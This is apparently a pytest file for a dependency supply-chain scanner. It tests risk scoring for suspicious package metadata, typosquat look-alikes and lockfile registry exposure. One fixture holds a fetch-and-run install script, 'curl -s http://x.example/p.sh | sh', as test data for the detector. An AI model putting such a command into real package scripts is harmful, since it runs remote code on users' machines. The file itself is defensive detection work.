from __future__ import annotations

from ripple.models import Category, Ecosystem, InstallScripts, PackageMetadata, PublicStatus, Resolution, Severity, severity_for_score
from ripple.scanners.exposure import detect_exposure
from ripple.scanners.metadata import analyse, detect_metadata, version_gap
from ripple.scanners.typosquatting import score_candidate
from ripple.parsers.base import ParsedLockfile

from conftest import NOW, days_ago, make_ctx, make_pkg, make_record

E = Ecosystem


def det_for(pkg, rec):
    ctx = make_ctx([pkg], {pkg.name: rec})
    return analyse(pkg, rec, ctx)


def labels(d):
    return {x.label: x.points for x in d.drivers}


def test_new_package_with_fetch_and_execute_script_is_high():
    pkg = make_pkg("colour-mixr", "3.2.0")
    rec = make_record(E.NPM, "colour-mixr", registered_at=days_ago(19), weekly_downloads=64, maintainers=["one"],
                      install_scripts=InstallScripts(postinstall="curl -s http://x.example/p.sh | sh"),
                      network_indicators=["curl in postinstall", "http:// URL in postinstall"])
    d = det_for(pkg, rec)
    got = labels(d)
    assert got["Recent registration"] == 22 and got["Very low downloads"] == 14 and got["Install script"] == 12
    assert got["Network behaviour in script"] == 15 and "Single new maintainer" in got
    assert severity_for_score(d.raw_score) in (Severity.HIGH, Severity.CRITICAL)
    assert d.rule_id == "RIPPLE-MD-004" and d.category is Category.SUSPICIOUS_METADATA


def test_maintainer_change_signals():
    pkg = make_pkg("pdf-kit", "1.0.0")
    one = det_for(pkg, make_record(E.NPM, "pdf-kit", registered_at=days_ago(900), weekly_downloads=500,
                                   maintainer_changes=1, install_scripts=InstallScripts(postinstall="node x.js")))
    assert labels(one)["Maintainer change"] == 15 and one.rule_id == "RIPPLE-MD-001"
    two = det_for(pkg, make_record(E.NPM, "pdf-kit", registered_at=days_ago(900), weekly_downloads=500, maintainer_changes=3))
    assert labels(two)["Maintainer changes"] == 22


def test_established_packages_get_a_discount_and_are_not_flagged_for_install_scripts():
    pkg = make_pkg("esbuild", "0.19.5")
    rec = make_record(E.NPM, "esbuild", registered_at=days_ago(3000), weekly_downloads=30_000_000,
                      install_scripts=InstallScripts(postinstall="node install.js"))
    assert det_for(pkg, rec) is None
    assert detect_metadata(make_ctx([pkg], {"esbuild": rec})) == []


def test_below_threshold_signals_do_not_emit():
    pkg = make_pkg("tiny", "1.0.0")
    assert det_for(pkg, make_record(E.NPM, "tiny", registered_at=days_ago(900), weekly_downloads=800)) is None   # +8 only
    assert det_for(pkg, make_record(E.NPM, "tiny", registered_at=days_ago(900), weekly_downloads=10_000)) is None


def test_ecosystem_specific_script_signals():
    crate = make_pkg("tinyring", "0.2.0", E.RUST)
    d = det_for(crate, make_record(E.RUST, "tinyring", registered_at=days_ago(60), weekly_downloads=40,
                                   install_scripts=InstallScripts(build_script=True)))
    assert labels(d)["Build script (build.rs)"] == 5
    pyp = make_pkg("thing", "1.0", E.PYPI)
    d2 = det_for(pyp, make_record(E.PYPI, "thing", registered_at=days_ago(60), weekly_downloads=40,
                                  install_scripts=InstallScripts(build_script=True)))
    assert labels(d2)["Source-only distribution"] == 4


def test_version_gap_and_deprecated():
    assert version_gap("4.0.3", "7.1.0") == 3 and version_gap("1.0.0", "1.9.0") == 0 and version_gap("", "1.0.0") is None
    pkg = make_pkg("old-dep", "1.0.0")
    pkg.metadata = PackageMetadata(version_gap=3)
    d = det_for(pkg, make_record(E.NPM, "old-dep", registered_at=days_ago(2000), latest_version="4.0.0", deprecated=True, weekly_downloads=500))
    got = labels(d)
    assert got["Deprecated"] == 10 and got["Version gap"] == 8
    assert d.rule_id == "RIPPLE-MD-006"


def test_local_and_vcs_and_skipped_packages_are_ignored():
    pkg = make_pkg("x", "1", resolution=Resolution.VCS)
    rec = make_record(E.NPM, "x", registered_at=days_ago(1), install_scripts=InstallScripts(postinstall="curl x"), network_indicators=["curl in postinstall"])
    assert detect_metadata(make_ctx([pkg], {"x": rec})) == []
    ok = make_pkg("y", "1")
    rec.name = "y"
    assert detect_metadata(make_ctx([ok], {"y": rec}))
    assert detect_metadata(make_ctx([ok], {"y": rec}), skip={ok.id}) == []


# ---------------------------------------------------------------------- look-alike candidate scoring
def test_candidate_scoring_is_explainable_and_ordered():
    orig = make_record(E.PYPI, "requests", weekly_downloads=60_000_000, maintainers=["psf"])
    bad = make_record(E.PYPI, "requ3sts", registered_at=days_ago(9), weekly_downloads=3, maintainers=["x"],
                      install_scripts=InstallScripts(build_script=True), network_indicators=["curl in setup.py"])
    old = make_record(E.PYPI, "python-requests", registered_at=days_ago(1100), weekly_downloads=12_000, maintainers=["y"])
    s_bad, d_bad = score_candidate("homoglyph", 0.875, bad, orig, NOW)
    s_old, d_old = score_candidate("prefix_suffix", 0.53, old, orig, NOW)
    assert s_bad > 80 > s_old > 20
    assert any(d.startswith("Recent registration +20") for d in d_bad) and any("Install script +15" in d for d in d_bad)
    assert score_candidate("deletion", 0.9, None, orig, NOW) == (0, ["Not registered - claimable by anyone"])


# ---------------------------------------------------------------------- exposure rules
def lock(kind="package-lock.json", eco=E.NPM, **kw):
    return ParsedLockfile(filename=kind, ecosystem=eco, kind=kind, **kw)


def test_exposure_rules_and_scores():
    http = make_pkg("legacy", "0.9.4", registry_source="http://registry.npmjs.org", resolution=Resolution.EXACT, direct=True, source_file="package-lock.json")
    git = make_pkg("ui-kit", "0.8.0", registry_source="git+ssh://git@github.com/a/ui.git#main", resolution=Resolution.VCS, direct=True, source_file="package-lock.json")
    pinned = make_pkg("lint", "1.0.0", registry_source="git+ssh://git@github.com/a/l.git#" + "a" * 40, resolution=Resolution.VCS, source_file="package-lock.json")
    floating = make_pkg("dotenv", "16.3.1", spec="latest", resolution=Resolution.HASHED, integrity="x", direct=True, source_file="package-lock.json")
    ctx = make_ctx([http, git, pinned, floating], lockfiles={"package-lock.json": lock()})
    dets = {d.package_id: d for d in detect_exposure(ctx) if d.category is Category.REGISTRY_EXPOSURE}
    rules = {d.rule_id for d in detect_exposure(ctx)}
    assert {"RIPPLE-RE-001", "RIPPLE-RE-002", "RIPPLE-RE-003", "RIPPLE-RE-004", "RIPPLE-RE-006"} <= rules
    assert dets[git.id].rule_id == "RIPPLE-RE-004" and dets[pinned.id].rule_id == "RIPPLE-RE-003"
    assert dets[pinned.id].raw_score < dets[git.id].raw_score
    assert any(d.package_id == http.id and d.rule_id == "RIPPLE-RE-001" and d.raw_score >= 40 for d in detect_exposure(ctx))


def test_mixed_index_finding_prefers_internal_looking_package():
    lf = lock("requirements.txt", E.PYPI, extra_index_urls=["https://pypi.acme.corp/simple"], index_urls=[])
    a = make_pkg("acme-internal-auth", "", E.PYPI, resolution=Resolution.RANGE, spec=">=1", source_file="requirements.txt")
    b = make_pkg("requests", "2.31.0", E.PYPI, resolution=Resolution.HASHED, integrity="sha256:x", source_file="requirements.txt", direct=True)
    dets = [d for d in detect_exposure(make_ctx([a, b], lockfiles={"requirements.txt": lf})) if d.rule_id == "RIPPLE-RE-005"]
    assert len(dets) == 1 and dets[0].package_id == a.id


def test_missing_hashes_aggregate_for_unhashed_requirements():
    pk = [make_pkg(f"pkg{i}", "1.0", E.PYPI, resolution=Resolution.EXACT, source_file="requirements.txt", direct=True) for i in range(8)]
    dets = [d for d in detect_exposure(make_ctx(pk, lockfiles={"requirements.txt": lock("requirements.txt", E.PYPI)})) if d.rule_id == "RIPPLE-RE-002"]
    assert len(dets) == 1 and "aggregated" in dets[0].tags
    few = [d for d in detect_exposure(make_ctx(pk[:2], lockfiles={"requirements.txt": lock("requirements.txt", E.PYPI)})) if d.rule_id == "RIPPLE-RE-002"]
    assert len(few) == 1                                                       # requirements with no hashes anywhere => one aggregate
